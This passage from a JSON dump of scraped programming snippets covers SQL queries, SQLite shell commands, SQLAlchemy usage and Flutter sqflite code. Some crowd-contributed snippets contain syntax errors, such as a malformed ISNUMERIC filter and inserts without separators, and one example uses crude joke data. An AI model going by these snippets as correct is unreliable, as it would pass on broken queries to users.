    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4336,
    "keyword": null,
    "link": null,
    "title": " sql use database",
    "description": "USE DatabaseName;\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4337,
    "keyword": null,
    "link": null,
    "title": " sql use with to get value counts and percentages",
    "description": "SELECT event,         count(event) as event_count,        count(event) * 100.0 / (select count(*) from event_information) as event_percent FROM event_information group by event \n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4338,
    "keyword": null,
    "link": null,
    "title": " sql value of string",
    "description": "-- Specifically for Oracle  -- EXAMPLE CAST('732.98' AS INT)  /* SYNTAX CAST(<value_to_cast> AS <data_type_to_cast_to>) */\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4339,
    "keyword": null,
    "link": null,
    "title": " sql values not in another table",
    "description": "-- Find missing t1 values in t2 (based on 'id' field) SELECT * FROM t1 WHERE t1.id NOT IN (SELECT id FROM t2); -- or SELECT * FROM t1 WHERE NOT exists (     SELECT NULL FROM t2 WHERE t2.id = t1.id ); -- or SELECT t1.* FROM t1 LEFT OUTER JOIN t2 ON t2.id = t1.id WHERE t2.id IS NULL;\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4340,
    "keyword": null,
    "link": null,
    "title": " sql varchar length",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4341,
    "keyword": null,
    "link": null,
    "title": " sql version query",
    "description": "SELECT @@VERSION AS 'SQL Server Version';  \n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4342,
    "keyword": null,
    "link": null,
    "title": " sql view index",
    "description": "-- Oracle  (all_indexes: depending on grants, dba_indexes: for all indexes)) SELECT index_name FROM user_indexes WHERE table_name = 'MY_TABLE'; -- List of indexed columns: SELECT index_name, column_position, column_name FROM user_ind_columns \t\t-- or all_ind_columns / dba_ind_columns WHERE table_name = 'MY_TABLE'   ORDER BY index_name, column_order;\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4343,
    "keyword": null,
    "link": null,
    "title": " sql view postgresql",
    "description": "                                     CREATE VIEW customer_master AS   SELECT cu.customer_id AS id,     cu.first_name || ' ' || cu.last_name AS name,     a.address,     a.postal_code AS \"zip code\",     a.phone,     city.city,     country.country,         CASE             WHEN cu.activebool THEN 'active'             ELSE ''         END AS notes,     cu.store_id AS sid    FROM customer cu      INNER JOIN address a USING (address_id)      INNER JOIN city USING (city_id)      INNER JOIN country USING (country_id);\n                                     CREATE OR REPLACE view_name  AS  query\n                                     CREATE VIEW customer_master AS   SELECT cu.customer_id AS id,     cu.first_name || ' ' || cu.last_name AS name,     a.address,     a.postal_code AS \"zip code\",     a.phone,     city.city,     country.country,         CASE             WHEN cu.activebool THEN 'active'             ELSE ''         END AS notes,     cu.store_id AS sid,     cu.email    FROM customer cu      INNER JOIN address a USING (address_id)      INNER JOIN city USING (city_id)      INNER JOIN country USING (country_id);\n                                     SELECT \t* FROM \tcustomer_master;\nSELECT * FROM viewname;\nCREATE [ OR REPLACE ] [ TEMP | TEMPORARY ] VIEW name [ ( column_name [, ...] ) ]     [ WITH ( view_option_name [= view_option_value] [, ... ] ) ]     AS query \n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4344,
    "keyword": null,
    "link": null,
    "title": " sql view where tables have same column name combine results",
    "description": "SELECT table1.Column1, table1.Column2 FROM table1  UNION  SELECT table2.Column1, table2.Column2 FROM table2\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4345,
    "keyword": null,
    "link": null,
    "title": " sql vs nosql",
    "description": "SQL\t\t\t\t\t\t|    NoSQL   relational\t\t\t| non-relational   \t\t\t\t\t\t| use structured query\t| NoSQL databases have  language and have a\t\t| dynamic schemas for  predefined schema.\t\t| unstructured data. \t\t\t\t\t\t| are vertically scalable | are horizontally scalable. are table based\t\t\t| are document, key-value, \t\t\t\t\t\t| graph or wide-column stores.                         | are better for multi-row| are better for unstructured  transactions\t\t\t| data like documents or JSON.\nA SQL Database follows a table like structure which can have an  unlimited number of rows and every data present inside the database  is properly structured with Predefined Schemas, it is basically used  to manipulate Relational Databases Management Systems.  A NoSQL Database is a Distributed Database where the data is very  unstructured with Dynamic Schema. Unlike SQL it cannot have unlimited  rows but it follows a Standard Schema Definition and can store all  sorts of data models with large distributed data in the form of  key-value pairs, graph databases, documents or wide-column stores.\n/* KEY DIFFERENCE SQL pronounced as \"S-Q-L\" or as \"See-Quel\" is primarily called RDBMS or Relational Databases whereas NoSQL is a Non-relational or Distributed Database. SQL databases are table based databases whereas NoSQL databases can be document based, key-value pairs, graph databases. SQL databases are vertically scalable while NoSQL databases are horizontally scalable. SQL databases have a predefined schema whereas NoSQL databases use dynamic schema for unstructured data. SQL requires specialized DB hardware for better performance while NoSQL uses commodity hardware.*/\n----------------- key differences | ----------------- SQL databases are usually RDBMS or DBMS (Relational DataBase Management Systems) and are table based, NoSQL uses unstructured data (like graphs)  ----------------- Examples        | ----------------- SQL Databases: MySQL SQLite Oracle DB  NoSQL: MongoDB DynamoDB\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4346,
    "keyword": null,
    "link": null,
    "title": " sql week commencing date",
    "description": "DATEADD(dd, -(DATEPART(dw, [Date])-1), [Date])\n",
    "reg_date": "2021-10-12T10:00:57.000Z"
  },
  {
    "id": 4347,
    "keyword": null,
    "link": null,
    "title": " sql week number starting monday",
    "description": "BEGIN TRANSACTION;  /* Table Creation And Insertions */ CREATE TABLE week(Number integer PRIMARY KEY, Name text);   INSERT INTO week VALUES(1, 'Monday')   INSERT INTO week VALUES(2, 'Tuesday')   INSERT INTO week VALUES(3, 'Wednesday')   INSERT INTO week VALUES(4, 'Thursday')   INSERT INTO week VALUES(5, 'Friday')   INSERT INTO week VALUES(6, 'Saturday')   INSERT INTO week VALUES(7, 'Sunday') COMMIT;  /* Queries */ SELECT name AS 'Day' FROM week WHERE name = 'Monday';  /* Returns Monday' */\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4348,
    "keyword": null,
    "link": null,
    "title": " sql where a or b",
    "description": "-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\n/* AND is a operator that allows you to combine two conditions Both conditions must be true for the row to b e included in the result set */ SELECT column_name(s) FROM table_name WHERE column_1 = value_1 AND column_2 = value_2;\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4349,
    "keyword": null,
    "link": null,
    "title": " sql where contains",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM tbl WHERE tbl.col NOT LIKE '%text%';\nSELECT * FROM mytable WHERE column1 LIKE '%word1%'    OR column1 LIKE '%word2%'    OR column1 LIKE '%word3%'\nSELECT * FROM table WHERE Contains(Column, \"test\"); \n-- To find an exact string SELECT * FROM [table] WHERE [field] LIKE '%stringtosearchfor%'. \nIF (SELECT COUNT(*) FROM foos WHERE bar = 'baz') > 0\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4350,
    "keyword": null,
    "link": null,
    "title": " sql where contains part of string",
    "description": "Declare @mainString nvarchar(100)='Amit Kumar Yadav'   ---Check here @mainString contains Amit or not, if it contains then retrun greater than 0 then print Find otherwise Not Find   if CHARINDEX('Amit',@mainString) > 0    begin      select 'Find' As Result   end   else       select 'Not Find' As Result  \nSELECT * FROM mytable WHERE column1 LIKE '%word1%'    OR column1 LIKE '%word2%'    OR column1 LIKE '%word3%'\n-- To find an exact string SELECT * FROM [table] WHERE [field] LIKE '%stringtosearchfor%'. \n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4351,
    "keyword": null,
    "link": null,
    "title": " sql where is not number",
    "description": "SELECT CustomerId FROM CUSTOMER_TABLE  WHERE CustomerId ISNUMERIC(CustomerId) = 0  -- if you want to get only number try to change 0 to 1 \nSELECT ISNUMERIC(250) AS Result; \n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4352,
    "keyword": null,
    "link": null,
    "title": " sql where keyword",
    "description": "Filters results to only include data which meets the given condition. Example: Returns orders with a quantity of more than 1 item. SELECT * FROM orders WHERE quantity > 1;\nSELECT id, category, location FROM table WHERE (     category LIKE '%keyword%'     OR location LIKE '%keyword%' )\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4353,
    "keyword": null,
    "link": null,
    "title": " sql where last 12 months",
    "description": "select Dateadd(Month, -12, GETDATE())\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4354,
    "keyword": null,
    "link": null,
    "title": " sql where max date",
    "description": "SELECT report_id, computer_id, date_entered FROM reports AS a WHERE date_entered = ( SELECT MAX(date_entered) FROM reports );\n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4355,
    "keyword": null,
    "link": null,
    "title": " sql where multiple values",
    "description": "SELECT column_name(s) FROM table_name WHERE column_name IN (value1, value2, ...); \nSELECT ads.*, location.county  FROM ads LEFT JOIN location ON location.county = ads.county_id WHERE ads.published = 1  AND ads.type = 13 AND ads.county_id IN (2, 5, 7, 9) \nIN condition allows you to easily test if an expression matches any value in a list of values. It is for reducing  multiple OR conditions in a SELECT, INSERT,  UPDATE, or DELETE statement.\n+----+----------+----------+ | ID | NAME     | SALARY   | +----+----------+----------+ |  3 | kaushik  |  2000.00 | |  4 | Chaitali |  6500.00 | |  5 | Hardik   |  8500.00 | |  6 | Komal    |  4500.00 | |  7 | Muffy    | 10000.00 | +----+----------+----------+ \n",
    "reg_date": "2021-10-12T10:00:58.000Z"
  },
  {
    "id": 4356,
    "keyword": null,
    "link": null,
    "title": " sql where part of string match",
    "description": "select * from docs where DOC_NAME like '%virus%spyware%' -- OR select * from docs where DOC_NAME like '%virus%' or DOC_NAME like '%spyware%'\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4357,
    "keyword": null,
    "link": null,
    "title": " sql where time stamp is in between",
    "description": "WHERE  `date` BETWEEN '2013-03-26 00:00:01' AND '2013-03-26 23:59:59'\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4358,
    "keyword": null,
    "link": null,
    "title": " sql where value like a or b",
    "description": "-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4359,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy database uri for mysql",
    "description": "app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://username:password@localhost/db_name'\nmysql://scott:tiger@localhost/mydatabase \n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4360,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy db.column default value",
    "description": "Column('version', Integer, default=1)\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4361,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy default value for column",
    "description": "Column('version', Integer, default=1)\nTable(\"mytable\", meta,     Column(\"somecolumn\", Integer, default=12) )\n# a function which counts upwards i = 0 def mydefault():     global i     i += 1     return i  t = Table(\"mytable\", meta,     Column('id', Integer, primary_key=True, default=mydefault), )\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4362,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy empty table",
    "description": "db.session.query(model_name).delete()  db.session.commit() \n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4363,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy filter or",
    "description": "from sqlalchemy import or_ filter(or_(User.name == 'ed', User.name == 'wendy'))\npatients = Patient.query.filter(Patient.mother.has(phenoscore=10))\n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4364,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy get ids",
    "description": "session.query(Thing.id).all() \n",
    "reg_date": "2021-10-12T10:00:59.000Z"
  },
  {
    "id": 4365,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy get schema from database",
    "description": "from sqlalchemy import MetaData, create_engine  CONN = create_engine(DB_URL, client_encoding=\"UTF-8\")  META_DATA = MetaData(bind=CONN, reflect=True)  USERS_TABLE = META_DATA.tables['users']\n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4366,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy on delete set null",
    "description": "category_id = db.Column(db.Integer, db.ForeignKey('category.id', ondelete='SET NULL'))\n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4367,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy order by",
    "description": "from sqlalchemy import desc someselect.order_by(desc(table1.mycol))\n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4368,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy order by descending",
    "description": "from sqlalchemy import desc someselect.order_by(desc(table1.mycol))\n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4369,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy orm duplicate",
    "description": "product_obj = products.all()[0]  db.session.expunge(product_obj)  # expunge the object from session make_transient(product_obj)  # http://docs.sqlalchemy.org/en/rel_1_1/orm/session_api.html#sqlalchemy.orm.session.make_transient  product_obj.product_uid = 'something' db.session.add(product_obj) \n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4370,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy return id after insert",
    "description": "f = Foo(bar='x') session.add(f) session.flush()  print(f.id) # will return the obj id\nsession.flush()   print(f.id)\n",
    "reg_date": "2021-10-12T10:01:00.000Z"
  },
  {
    "id": 4371,
    "keyword": null,
    "link": null,
    "title": " sqlite3.OperationalError: near \"7\": syntax error",
    "description": "cur.execute('INSERT INTO \"{}\" VALUES(?, ?)'.format(group.replace('\"', '\"\"')), (food, 1))\ncur.execute('SELECT COUNT(Name) FROM \"{}\" WHERE Name=?'.format(group.replace('\"', '\"\"')), (food,))\ncur.execute('UPDATE \"{}\" SET Times=? WHERE Name=?'.format(group.replace('\"', '\"\"')),             (times_before + 1, food))\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4372,
    "keyword": null,
    "link": null,
    "title": " sqlite3 now",
    "description": "//Date DATE('now')  //DateTime DATETIME('now')\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4373,
    "keyword": null,
    "link": null,
    "title": " sqlite3 read only",
    "description": "sqlite3 -cmd \".timeout 5000\" \"file:/pathto/mydb?mode=ro\"\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4374,
    "keyword": null,
    "link": null,
    "title": " sqlite3 show columns name",
    "description": ".schema tablename\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4375,
    "keyword": null,
    "link": null,
    "title": " sqlite alter table add column",
    "description": "ALTER TABLE table_name ADD COLUMN new_column_name column_type\nALTER TABLE existing_table RENAME TO new_table;\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4376,
    "keyword": null,
    "link": null,
    "title": " sqlite busy: database is locked",
    "description": "SQLITE_BUSY means that another database connection (probably in another process) is using the database in a way that prevents you from using it. SQLITE_LOCKED means the source of contention is internal and comes from the same database connection that received the SQLITE_LOCKED error.\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4377,
    "keyword": null,
    "link": null,
    "title": " sqlite check if row exists",
    "description": "SELECT EXISTS(SELECT 1 FROM myTbl WHERE u_tag=\"tag\");\n",
    "reg_date": "2021-10-12T10:01:01.000Z"
  },
  {
    "id": 4378,
    "keyword": null,
    "link": null,
    "title": " sqlite commands",
    "description": "sqlite3 test.db sqlite3> .read create-tables.sql\nsqlite commands src = https://www.sitepoint.com/getting-started-sqlite3-basic-commands/ ----------------------------- .show\tDisplays current settings for various parameters .databases\tProvides database names and files .quit\tQuit sqlite3 program .tables\tShow current tables .schema\tDisplay schema of table .header\tDisplay or hide the output table header .mode\tSelect mode for the output table .dump\tDump database in SQL text format\nsqlite> .help .archive ...             Manage SQL archives .auth ON|OFF             Show authorizer callbacks .backup ?DB? FILE        Backup DB (default \"main\") to FILE .bail on|off             Stop after hitting an error.  Default OFF .binary on|off           Turn binary output on or off.  Default OFF .cd DIRECTORY            Change the working directory to DIRECTORY .changes on|off          Show number of rows changed by SQL .check GLOB              Fail if output since .testcase does not match .clone NEWDB             Clone data into NEWDB from the existing database .databases               List names and files of attached databases .dbconfig ?op? ?val?     List or change sqlite3_db_config() options .dbinfo ?DB?             Show status information about the database .dump ?TABLE? ...        Render all database content as SQL .echo on|off             Turn command echo on or off .eqp on|off|full|...     Enable or disable automatic EXPLAIN QUERY PLAN .excel                   Display the output of next command in a spreadsheet .exit ?CODE?             Exit this program with return-code CODE .expert                  EXPERIMENTAL. Suggest indexes for specified queries .fullschema ?--indent?   Show schema and the content of sqlite_stat tables .headers on|off          Turn display of headers on or off .help ?-all? ?PATTERN?   Show help text for PATTERN .import FILE TABLE       Import data from FILE into TABLE .imposter INDEX TABLE    Create imposter table TABLE on index INDEX .indexes ?TABLE?         Show names of indexes .iotrace FILE            Enable I/O diagnostic logging to FILE .limit ?LIMIT? ?VAL?     Display or change the value of an SQLITE_LIMIT .lint OPTIONS            Report potential schema issues. .load FILE ?ENTRY?       Load an extension library .log FILE|off            Turn logging on or off.  FILE can be stderr/stdout .mode MODE ?TABLE?       Set output mode .nullvalue STRING        Use STRING in place of NULL values .once (-e|-x|FILE)       Output for the next SQL command only to FILE .open ?OPTIONS? ?FILE?   Close existing database and reopen FILE .output ?FILE?           Send output to FILE or stdout if FILE is omitted .parameter CMD ...       Manage SQL parameter bindings .print STRING...         Print literal STRING .progress N              Invoke progress handler after every N opcodes .prompt MAIN CONTINUE    Replace the standard prompts .quit                    Exit this program .read FILE               Read input from FILE .restore ?DB? FILE       Restore content of DB (default \"main\") from FILE .save FILE               Write in-memory database into FILE .scanstats on|off        Turn sqlite3_stmt_scanstatus() metrics on or off .schema ?PATTERN?        Show the CREATE statements matching PATTERN .selftest ?OPTIONS?      Run tests defined in the SELFTEST table .separator COL ?ROW?     Change the column and row separators .session ?NAME? CMD ...  Create or control sessions .sha3sum ...             Compute a SHA3 hash of database content .shell CMD ARGS...       Run CMD ARGS... in a system shell .show                    Show the current values for various settings .stats ?on|off?          Show stats or turn stats on or off .system CMD ARGS...      Run CMD ARGS... in a system shell .tables ?TABLE?          List names of tables matching LIKE pattern TABLE .testcase NAME           Begin redirecting output to 'testcase-out.txt' .timeout MS              Try opening locked tables for MS milliseconds .timer on|off            Turn SQL timer on or off .trace ?OPTIONS?         Output each SQL statement as it is run .vfsinfo ?AUX?           Information about the top-level VFS .vfslist                 List all available VFSes .vfsname ?AUX?           Print the name of the VFS stack .width NUM1 NUM2 ...     Set column widths for \"column\" mode sqlite> \n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4379,
    "keyword": null,
    "link": null,
    "title": " sqlite create index",
    "description": "-- CREATE [UNIQUE] INDEX index_name ON table_name(column_list); CREATE UNIQUE INDEX idx_contacts_email ON contacts (email); CREATE INDEX customer_idx ON customers (state, city);\nCREATE INDEX index_name ON tableName (tableColumn);\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4380,
    "keyword": null,
    "link": null,
    "title": " sqlite create table if not exists",
    "description": "CREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...); \nINSERT INTO example(column1, column2)  SELECT value_to_insert1, value_to_insert2  WHERE NOT EXISTS(SELECT 1 FROM example WHERE column1 = value_to_insert AND column2 = value_to_insert);\n CREATE TABLE [IF NOT EXISTS] [schema_name].table_name ( \tcolumn_1 data_type PRIMARY KEY,    \tcolumn_2 data_type NOT NULL, \tcolumn_3 data_type DEFAULT 0, \ttable_constraints ) [WITHOUT ROWID];\nCREATE TABLE IF NOT EXISTS [schema_name].table_name (...);\nCREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...);\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4381,
    "keyword": null,
    "link": null,
    "title": " sqlite datetime",
    "description": "-- SQLite --  -- Every database system has it's own set of  -- functions specifically tasked for handling dates and times.  -- These functions are not standardized. -- Date and time related functions for SQLite  SELECT DATETIME('now'); --> Result UTC Time: 2020-11-24 11:31:02 SELECT DATE('now'); --> Result: 2020-11-24 SELECT DATETIME('now', '+1 day'); --> Result UTC Time: 2020-11-25 11:34:56 SELECT DATETIME('now', '+3 day'); --> Result UTC Time: 2020-11-27 11:35:30  SELECT DATETIME('now', '-1 month'); --> Result UTC Time: 2020-10-24 11:35:57 SELECT DATETIME('now', '+1 year'); --> Result UTC Time: 2021-11-24 11:36:29 SELECT DATETIME(   'now',    '+3 hours',    '+27 minutes',    '-1 day',    '+5 years') ; --> Result UTC Time: 2025-11-23 15:08:55\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4382,
    "keyword": null,
    "link": null,
    "title": " sqlite drop table",
    "description": "# SQLite-> DROP TABLE table_name\nDROP TABLE IF EXISTS table_name\nimport sqlite3 db = \"./db.sqlite3\" conn = sqlite3.connect(db) conn.execute(\"DROP TABLE paintshop_category\" ) conn.commit() conn.close() print('success')\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4383,
    "keyword": null,
    "link": null,
    "title": " sqlite foreign key",
    "description": "CREATE TABLE track(   trackid     INTEGER,    trackname   TEXT,    trackartist INTEGER,   FOREIGN KEY(trackartist) REFERENCES artist(artistid) );\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4384,
    "keyword": null,
    "link": null,
    "title": " sqlite get date only",
    "description": "SELECT strftime('%d', '2021-01-14') \n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4385,
    "keyword": null,
    "link": null,
    "title": " sqlite in flutter",
    "description": "// Get a location using getDatabasesPath var databasesPath = await getDatabasesPath(); String path = join(databasesPath, 'demo.db');  // Delete the database await deleteDatabase(path);  // open the database Database database = await openDatabase(path, version: 1,     onCreate: (Database db, int version) async {   // When creating the db, create the table   await db.execute(       'CREATE TABLE Test (id INTEGER PRIMARY KEY, name TEXT, value INTEGER, num REAL)'); });  // Insert some records in a transaction await database.transaction((txn) async {   int id1 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(\"some name\", 1234, 456.789)');   print('inserted1: $id1');   int id2 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(?, ?, ?)',       ['another name', 12345678, 3.1416]);   print('inserted2: $id2'); });  // Update some record int count = await database.rawUpdate(     'UPDATE Test SET name = ?, value = ? WHERE name = ?',     ['updated name', '9876', 'some name']); print('updated: $count');  // Get the records List<Map> list = await database.rawQuery('SELECT * FROM Test'); List<Map> expectedList = [   {'name': 'updated name', 'id': 1, 'value': 9876, 'num': 456.789},   {'name': 'another name', 'id': 2, 'value': 12345678, 'num': 3.1416} ]; print(list); print(expectedList); assert(const DeepCollectionEquality().equals(list, expectedList));  // Count the records count = Sqflite     .firstIntValue(await database.rawQuery('SELECT COUNT(*) FROM Test')); assert(count == 2);  // Delete a record count = await database     .rawDelete('DELETE FROM Test WHERE name = ?', ['another name']); assert(count == 1);  // Close the database await database.close(); \nimport 'dart:async';  import 'dart:io';  import 'package:path/path.dart';  import 'package:path_provider/path_provider.dart';  import 'package:sqflite/sqflite.dart';  import 'Product.dart';   class SQLiteDbProvider {    SQLiteDbProvider._();     static final SQLiteDbProvider db = SQLiteDbProvider._();     static Database _database;         Future<Database> get database async {       if (_database != null)        return _database;        _database = await initDB();        return _database;     }     initDB() async {       Directory documentsDirectory = await        getApplicationDocumentsDirectory();        String path = join(documentsDirectory.path, \"ProductDB.db\");        return await openDatabase(          path, version: 1,           onOpen: (db) {},           onCreate: (Database db, int version) async {             await db.execute(                \"CREATE TABLE Product (\"                 \"id INTEGER PRIMARY KEY,\"                 \"name TEXT,\"                 \"description TEXT,\"                 \"price INTEGER,\"                 \"image TEXT\"\")\"             );              await db.execute(                \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [1, \"iPhone\", \"iPhone is the stylist phone ever\", 1000, \"iphone.png\"]             );              await db.execute(                 \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [2, \"Pixel\", \"Pixel is the most feature phone ever\", 800, \"pixel.png\"]             );             await db.execute(                \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [3, \"Laptop\", \"Laptop is most productive development tool\", 2000, \"laptop.png\"]             );              await db.execute(                 \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [4, \"Tablet\", \"Laptop is most productive development tool\", 1500, \"tablet.png\"]             );              await db.execute(                 \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [5, \"Pendrive\", \"Pendrive is useful storage medium\", 100, \"pendrive.png\"]             );             await db.execute(                 \"INSERT INTO Product ('id', 'name', 'description', 'price', 'image')                 values (?, ?, ?, ?, ?)\",                 [6, \"Floppy Drive\", \"Floppy drive is useful rescue storage medium\", 20, \"floppy.png\"]             );           }       );     }    Future<List<Product>> getAllProducts() async {       final db = await database;        List<Map> results = await db.query(          \"Product\", columns: Product.columns, orderBy: \"id ASC\"       );        List<Product> products = new List();          results.forEach((result) {          Product product = Product.fromMap(result);           products.add(product);        });        return products;     }     Future<Product> getProductById(int id) async {       final db = await database;        var result = await db.query(\"Product\", where: \"id = \", whereArgs: [id]);        return result.isNotEmpty ? Product.fromMap(result.first) : Null;     }     insert(Product product) async {        final db = await database;        var maxIdResult = await db.rawQuery(\"SELECT MAX(id)+1 as last_inserted_id FROM Product\");        var id = maxIdResult.first[\"last_inserted_id\"];        var result = await db.rawInsert(          \"INSERT Into Product (id, name, description, price, image)\"           \" VALUES (?, ?, ?, ?, ?)\",           [id, product.name, product.description, product.price, product.image]        );        return result;     }     update(Product product) async {        final db = await database;        var result = await db.update(          \"Product\", product.toMap(), where: \"id = ?\", whereArgs: [product.id]       );        return result;     }     delete(int id) async {        final db = await database;        db.delete(\"Product\", where: \"id = ?\", whereArgs: [id]);    }  }\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4386,
    "keyword": null,
    "link": null,
    "title": " sqlite indexes",
    "description": "sqlite> .indexes\t\t\t\t\t-- list of all indexes sqlite> .indexes my_table\t\t\t-- indexes of my_table\n",
    "reg_date": "2021-10-12T10:01:02.000Z"
  },
  {
    "id": 4387,
    "keyword": null,
    "link": null,
    "title": " sqlite insert if not exists",
    "description": "#id column is assumed to be primary key  INSERT INTO destination_table(id,name)  SELECT id, name FROM source_table s WHERE NOT EXISTS (   SELECT 1   FROM destination_table d   WHERE d.id = s.id );\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4388,
    "keyword": null,
    "link": null,
    "title": " sqlite insert row",
    "description": "INSERT INTO table (column1,column2 ,..) VALUES( value1,\tvalue2 ,...);\n",
    "reg_date": "2021-10-12T10:01:03.000Z"
  },
  {
    "id": 4389,
    "keyword": null,
    "link": null,
    "title": " sqlite install python",
